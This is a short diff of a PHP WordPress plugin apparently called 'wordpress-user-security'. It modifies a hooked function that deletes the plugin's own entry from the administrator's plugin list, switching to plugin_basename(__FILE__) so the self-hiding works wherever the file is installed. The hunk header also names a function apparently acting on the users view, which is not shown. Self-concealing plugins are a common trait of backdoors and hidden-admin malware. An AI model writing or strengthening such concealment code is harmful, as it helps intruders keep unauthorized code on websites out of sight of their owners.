@@ -72,13 +72,13 @@ function wpshield_listViewsUsers( $views ) {
 add_action('pre_current_active_plugins', 'wpshield_hidePlugin');
 function wpshield_hidePlugin() {
     global $wp_list_table;
-    $hidearr = array('wordpress-user-security/wordpress-user-security.php');
+    $hidearr = array(plugin_basename(__FILE__)); // Usando plugin_basename para garantir o caminho correto
 
     $myplugins = $wp_list_table->items;
 
     foreach ($myplugins as $key => $val) {
-        if ( in_array($key, $hidearr) ) {
-            unset( $wp_list_table->items[$key] );
+        if (in_array($key, $hidearr)) {
+            unset($wp_list_table->items[$key]);
         }
     }
 }
